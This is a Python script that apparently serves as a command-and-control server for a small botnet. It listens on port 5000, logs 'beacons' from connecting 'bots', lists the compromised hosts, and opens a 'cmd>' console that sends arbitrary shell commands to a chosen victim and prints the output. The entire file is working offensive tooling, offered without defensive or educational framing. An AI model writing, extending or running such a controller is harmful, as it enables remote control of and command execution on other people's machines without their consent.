import socket
import threading
import sys

conn_list={}
def server():
    global conn_list
    HOST = ''                 # Symbolic name meaning all available interfaces
    PORT = 5000            # Arbitrary non-privileged port
    global count
    s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    s.bind((HOST, PORT))
    s.listen(1)
    while True:
        conn, addr = s.accept()
        if conn:
            conn_list[addr]=conn
            print('Beacon Recieved {}:{}\n>'.format(addr[0],addr[1]))


def client():
    global conn_list
    count = 0
    if conn_list:
        for key in conn_list:
            count+=1
            print("{}) {}:{}".format(count,key[0],key[1]))

    else:
        print("List is empty")



def trigger():
    global conn_list
    interaction=int(input("Whom you wanna interact with:-"))
    if interaction:
        if conn_list:
            console(conn_list[list(conn_list.keys())[interaction-1]],list(conn_list.keys())[interaction-1][0],list(conn_list.keys())[interaction-1][1],list(conn_list.keys())[interaction-1])
        else:
            print("No connections")

def console(conn,ip,port,socket_target):
    print("\n====Target::({}:{})====".format(ip,port))
    while True:
        commands=input("cmd>")
        if commands=='exit':
            return 0
        else:
            try:
                commands = bytes(commands, 'utf-8')
                conn.sendall(commands)
                print(conn.recv(64000).decode('utf-8'))

            except:
                print("====Host:{}:{} went offline===".format(ip,port))
                del conn_list[socket_target]
                return 0

def banner():
    print("[+] Ignite the light master and change this filthy reality...")

def main():
    banner()
    threading.Thread(target=server).start()
    print("[+] Server Started")
    while True:
        choice=input("\nPress 1 to view the current bots online\npress 2 to select to interact\n>")
        if choice=='1':
            p=threading.Thread(target=client)
            p.start()
            p.join()
        elif choice =='2':
            p=threading.Thread(target=trigger)
            p.start()
            p.join()
        else:
            pass


main()
